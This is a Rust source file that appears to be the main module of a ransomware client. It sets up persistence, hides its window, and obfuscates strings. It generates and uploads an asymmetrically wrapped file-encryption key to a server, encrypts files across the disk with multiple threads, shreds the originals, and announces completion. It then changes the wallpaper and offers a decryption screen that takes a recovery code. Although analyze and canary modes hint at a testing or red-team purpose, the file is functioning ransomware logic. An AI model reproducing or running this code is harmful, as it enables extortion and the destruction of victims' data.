#![cfg_attr(
    all(target_os = "windows", not(debug_assertions)),
    windows_subsystem = "windows"
)]
#![allow(clippy::similar_names)]
#![allow(clippy::too_many_arguments, clippy::too_many_lines)]

use hex::encode;
use log::{debug, error, info, warn};
use std::{
    path::{Path, PathBuf},
    sync::{
        Arc,
        atomic::{AtomicU64, Ordering},
    },
    thread,
};
use zeroize::Zeroize;

use coconut_crab_lib::{file::get_exe_path_dir, web::codes::RECOVERY_REQUEST_CODE};

mod persist;
use persist::{start_persist, stop_persist};

mod crypto;
use crypto::{
    decrypt, encrypt, encrypt_string, encrypt_sym_key, generate_sym_key, nonce_from_counter, record,
};

mod walker;
use walker::{random_walk_with_exts, walk_with_exts};

mod comm;
use comm::{
    announce_completion, download_asym_pub_key, get_sym_key, upload_sym_key,
    write_asym_pub_key_to_disk,
};

mod status;
use status::{Status, export_status_csv};

mod shredder;
use shredder::shred;

mod client;
use client::{ThreadNums, get_thread_nums, initialize_client};

mod img;
use img::set_icon_wallpaper;

mod canary;
use canary::filter_canary;

mod ui;
use ui::{callback_handler_init, set_window_icon};

#[macro_use]
extern crate litcrypt2;
extern crate alloc;
use_litcrypt!();

slint::include_modules!();

mod config;

fn main() {
    if cfg!(debug_assertions) {
        env_logger::Builder::new()
            .filter_level(log::LevelFilter::Debug)
            .init();
    } else {
        env_logger::Builder::new()
            .filter_level(log::LevelFilter::Off)
            .init();
    }

    let server_fqdn = config::SERVER_FQDN.as_str();
    let preshared_secret = config::PRESHARED_SECRET.as_str();

    if config::PERSIST {
        debug!("Establishing persistence");
        start_persist();
    }

    let exe_path_dir = get_exe_path_dir();
    let mut status = initialize_client(
        &exe_path_dir,
        server_fqdn,
        config::SERVER_PORT,
        preshared_secret,
        config::HTTPS,
        config::VERIFY_SERVER,
    );
    let num_threads = get_thread_nums();

    let mut sym_key = [0u8; 32];
    let counter = if status.encryption_started {
        AtomicU64::new(u64::MAX / 2) // Start at very high value on restart to avoid nonce reuse
    } else {
        AtomicU64::new(0)
    };

    if !status.encryption_complete {
        setup_encryption_keys(
            &mut status,
            &mut sym_key,
            &counter,
            &exe_path_dir,
            server_fqdn,
            preshared_secret,
        );
    }

    let sym_key_arc = Arc::new(sym_key);
    let counter_arc = Arc::new(counter);
    let encrypted_extension = config::ENCRYPTED_EXTENSION.to_string();
    let encrypted_extension_arc = Arc::new(encrypted_extension.clone());
    let wait_time_arc = Arc::new(config::WAIT_TIME);
    let jitter_time_arc = Arc::new(config::JITTER_TIME);
    let exe_path_dir_arc = Arc::new(exe_path_dir);

    if !status.encryption_complete {
        run_encryption_pipeline(
            &mut status,
            &sym_key_arc,
            &counter_arc,
            &encrypted_extension_arc,
            &wait_time_arc,
            &jitter_time_arc,
            &exe_path_dir_arc,
            &num_threads,
            server_fqdn,
            preshared_secret,
        );
    }

    sym_key.zeroize();
    debug!("Cleared symmetric key from memory");

    if config::SET_WALLPAPER {
        set_icon_wallpaper();
    }

    let ui = Main::new().expect("Failed to create Slint UI");
    set_window_icon(&ui);
    callback_handler_init(&ui);

    let s_decrypt = spawn_decryption_handler(
        &ui,
        &status,
        server_fqdn,
        preshared_secret,
        &encrypted_extension,
        num_threads.walk_threads,
        num_threads.decrypt_threads,
        config::PERSIST,
    );

    let ui_handle = ui.as_weak();
    ui.on_try_decrypt(move || {
        let ui = ui_handle.unwrap();

        let code = ui.get_code().to_string();
        info!("Verifying code: {code}");

        ui.set_status_text("Verifying code...".into());
        ui.set_status_progress(true);

        s_decrypt
            .send(Arc::new(code))
            .expect("Failed to send code to decryption handler thread");
    });

    ui.run().expect("Failed to run Slint UI");
}

fn setup_encryption_keys(
    status: &mut Status,
    sym_key: &mut [u8; 32],
    counter: &AtomicU64,
    exe_path_dir: &Path,
    server_fqdn: &str,
    preshared_secret: &str,
) {
    debug!("Encryption not previously completed");

    debug!("Starting key operations");
    if status.encryption_started {
        debug!("Encryption previously started");

        debug!("Starting key retrieval");
        *sym_key = if let Some(key) = get_sym_key(
            server_fqdn,
            config::SERVER_PORT,
            status,
            RECOVERY_REQUEST_CODE,
            preshared_secret,
            config::HTTPS,
            config::VERIFY_SERVER,
        ) {
            key
        } else {
            debug!("Unable to retrieve key. Marking encryption complete.");
            status.encryption_complete = true;
            [0u8; 32]
        };
    } else {
        debug!("Encryption not previously started");
        generate_sym_key(sym_key);

        let Some(asym_pub_key) = download_asym_pub_key(
            server_fqdn,
            config::SERVER_PORT,
            config::HTTPS,
            config::VERIFY_SERVER,
        ) else {
            error!("Unable to download asymmetric public key; marking encryption complete");
            status.encryption_complete = true;
            *sym_key = [0u8; 32];
            export_status_csv(exe_path_dir, status);
            return;
        };
        debug!("Got asymmetric public key: {asym_pub_key:?}");

        if config::SAVE_PUBLIC_KEY_TO_DISK {
            debug!("Saving asymmetric public key to disk");
            write_asym_pub_key_to_disk(&asym_pub_key, &exe_path_dir.join("asym-pub-key.pem"));
        }

        status.asymmetrically_encrypted_symmetric_key = encrypt_sym_key(&asym_pub_key, sym_key);
        debug!(
            "Encrypted symmetric key: {}",
            status.asymmetrically_encrypted_symmetric_key
        );

        upload_sym_key(
            server_fqdn,
            config::SERVER_PORT,
            status,
            preshared_secret,
            config::HTTPS,
            config::VERIFY_SERVER,
        )
        .expect("Failed to upload symmetric key");
        debug!("Uploaded encrypted symmetric key");

        let nonce = counter.fetch_add(1, Ordering::Relaxed);
        debug!("Nonce value after increment: {nonce}");

        let full_nonce_bytes = nonce_from_counter(nonce);
        debug!("Nonce value after padding: {full_nonce_bytes:?}");

        status.symmetrically_encrypted_id_nonce = encode(full_nonce_bytes);
        status.symmetrically_encrypted_id = encrypt_string(&status.id, sym_key, &full_nonce_bytes);
        debug!(
            "Added symmetrically encrypted id ({}) and nonce ({}) to status",
            status.symmetrically_encrypted_id, status.symmetrically_encrypted_id_nonce
        );
    }

    export_status_csv(exe_path_dir, status);
    debug!("Updated status CSV");
}

fn run_encryption_pipeline(
    status: &mut Status,
    sym_key: &Arc<[u8; 32]>,
    counter: &Arc<AtomicU64>,
    encrypted_extension: &Arc<String>,
    wait_time: &Arc<u32>,
    jitter_time: &Arc<u32>,
    exe_path_dir: &Arc<PathBuf>,
    num_threads: &ThreadNums,
    server_fqdn: &str,
    preshared_secret: &str,
) {
    debug!("Starting encryption process");

    status.encryption_started = true;
    export_status_csv(exe_path_dir.as_ref(), status);
    debug!("Updated status CSV");

    let cap = |consumers: usize| -> usize { std::cmp::max(consumers * 2, 64) };
    let (channel_a_sender, channel_a_receiver) =
        crossbeam_channel::bounded(cap(num_threads.encrypt_threads));
    let mut thread_handles = Vec::new();

    if config::RANDOM_ORDER {
        thread_handles.push(random_walk_with_exts(
            channel_a_sender.clone(),
            None,
            None,
            num_threads.walk_threads,
        ));
        debug!(
            "Spawned random walk coordinator with {} zlob workers",
            num_threads.walk_threads
        );
    } else {
        thread_handles.push(walk_with_exts(
            channel_a_sender.clone(),
            None,
            None,
            num_threads.walk_threads,
        ));
        debug!(
            "Spawned walk coordinator with {} zlob workers",
            num_threads.walk_threads
        );
    }
    drop(channel_a_sender);
    debug!(
        "All walk threads spawned. {} total threads spawned.",
        thread_handles.len()
    );

    if config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES {
        debug!("Canary mode enabled");

        let (channel_b_sender, channel_b_receiver) =
            crossbeam_channel::bounded(cap(num_threads.encrypt_threads_canary));

        for _ in 0..num_threads.canary_threads {
            thread_handles.push(filter_canary(
                channel_a_receiver.clone(),
                channel_b_sender.clone(),
            ));
        }
        drop(channel_a_receiver);
        drop(channel_b_sender);
        debug!(
            "All canary threads spawned. {} total threads spawned.",
            thread_handles.len()
        );

        if config::ANALYZE_MODE {
            debug!("Analyze mode enabled");
            thread_handles.push(record(channel_b_receiver.clone(), Arc::clone(exe_path_dir)));
            drop(channel_b_receiver);
        } else {
            let (channel_c_sender, channel_c_receiver) =
                crossbeam_channel::bounded(cap(num_threads.shred_threads));
            for _ in 0..num_threads.encrypt_threads_canary {
                thread_handles.push(encrypt(
                    channel_b_receiver.clone(),
                    channel_c_sender.clone(),
                    Arc::clone(sym_key),
                    Arc::clone(counter),
                    Arc::clone(encrypted_extension),
                    Arc::clone(wait_time),
                    Arc::clone(jitter_time),
                ));
            }
            drop(channel_b_receiver);
            drop(channel_c_sender);

            for _ in 0..num_threads.shred_threads {
                thread_handles.push(shred(channel_c_receiver.clone()));
            }
            drop(channel_c_receiver);
        }
    } else if config::ANALYZE_MODE {
        debug!("Analyze mode enabled");
        thread_handles.push(record(channel_a_receiver.clone(), Arc::clone(exe_path_dir)));
        drop(channel_a_receiver);
    } else {
        let (channel_c_sender, channel_c_receiver) =
            crossbeam_channel::bounded(cap(num_threads.shred_threads));
        for _ in 0..num_threads.encrypt_threads {
            thread_handles.push(encrypt(
                channel_a_receiver.clone(),
                channel_c_sender.clone(),
                Arc::clone(sym_key),
                Arc::clone(counter),
                Arc::clone(encrypted_extension),
                Arc::clone(wait_time),
                Arc::clone(jitter_time),
            ));
        }
        drop(channel_a_receiver);
        drop(channel_c_sender);

        for _ in 0..num_threads.shred_threads {
            thread_handles.push(shred(channel_c_receiver.clone()));
        }
        drop(channel_c_receiver);
    }

    for handle in thread_handles {
        debug!("Joining thread: {handle:?}");
        handle.join().expect("Thread panicked");
    }

    status.encryption_complete = true;
    debug!("Encryption complete");
    export_status_csv(exe_path_dir.as_ref(), status);
    debug!("Updated status CSV");

    if let Err(error) = announce_completion(
        server_fqdn,
        config::SERVER_PORT,
        status,
        preshared_secret,
        config::HTTPS,
        config::VERIFY_SERVER,
    ) {
        error!("Failed to announce completion: {error}");
    } else {
        debug!("Announced completion");
    }
}

fn spawn_decryption_handler(
    ui: &Main,
    status: &Status,
    server_fqdn: &str,
    preshared_secret: &str,
    encrypted_extension: &str,
    walk_threads: usize,
    decrypt_threads: usize,
    persist: bool,
) -> crossbeam_channel::Sender<Arc<String>> {
    let ui_handle = ui.as_weak();
    let (s_decrypt, r_decrypt) = crossbeam_channel::bounded(1);

    let status = status.clone();
    let server_fqdn = server_fqdn.to_string();
    let preshared_secret = preshared_secret.to_string();
    let encrypted_extension = encrypted_extension.to_string();

    thread::spawn(move || {
        debug!("Initializing decryption handler thread");

        let code: Arc<String> = match r_decrypt.recv() {
            Ok(key) => {
                debug!("Received code over channel: {key:?}");
                key
            }
            Err(error) => {
                warn!("Error receiving code over channel: {error}");
                return;
            }
        };

        debug!("Requesting symmetric key using user provided code");
        let Some(sym_key) = get_sym_key(
            &server_fqdn,
            config::SERVER_PORT,
            &status,
            &code,
            &preshared_secret,
            config::HTTPS,
            config::VERIFY_SERVER,
        ) else {
            if ui_handle
                .upgrade_in_event_loop(move |handle| {
                    handle.set_status_text("Code failed verification".into());
                })
                .is_err()
            {
                error!("Failed to upgrade UI handle");
            }
            if ui_handle
                .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
                .is_err()
            {
                error!("Failed to upgrade UI handle");
            }
            return;
        };

        info!("Starting decryption");
        if ui_handle
            .upgrade_in_event_loop(move |handle| {
                handle.set_status_text("Code successfully verified. Decrypting...".into());
            })
            .is_err()
        {
            error!("Failed to upgrade UI handle");
        }

        decrypt_files(sym_key, &encrypted_extension, walk_threads, decrypt_threads);

        info!("Decryption complete");
        if ui_handle
            .upgrade_in_event_loop(move |handle| {
                handle.set_status_text("Decryption complete".into());
            })
            .is_err()
        {
            error!("Failed to upgrade UI handle");
        }
        if ui_handle
            .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
            .is_err()
        {
            error!("Failed to upgrade UI handle");
        }

        if persist {
            debug!("Ending persistence");
            stop_persist();
        }
    });

    s_decrypt
}

fn decrypt_files(
    sym_key: [u8; 32],
    encrypted_extension: &str,
    walk_threads: usize,
    decrypt_threads: usize,
) {
    let (s3, r3) = crossbeam_channel::bounded(std::cmp::max(decrypt_threads * 2, 64));
    let mut thread_handles = Vec::new();

    debug!("Spawning walk coordinator for decryption with {walk_threads} zlob workers");
    thread_handles.push(walk_with_exts(
        s3.clone(),
        Some(vec![encrypted_extension.to_string()]),
        None,
        walk_threads,
    ));
    drop(s3);
    debug!(
        "All walk threads spawned. {} total threads spawned.",
        thread_handles.len()
    );

    let sym_key_arc = Arc::new(sym_key);
    for _ in 0..decrypt_threads {
        thread_handles.push(decrypt(r3.clone(), Arc::clone(&sym_key_arc)));
    }
    drop(r3);
    debug!(
        "All decryption threads spawned. {} total threads spawned.",
        thread_handles.len()
    );

    for handle in thread_handles {
        debug!("Joining thread: {handle:?}");
        handle.join().expect("Thread panicked");
    }
}
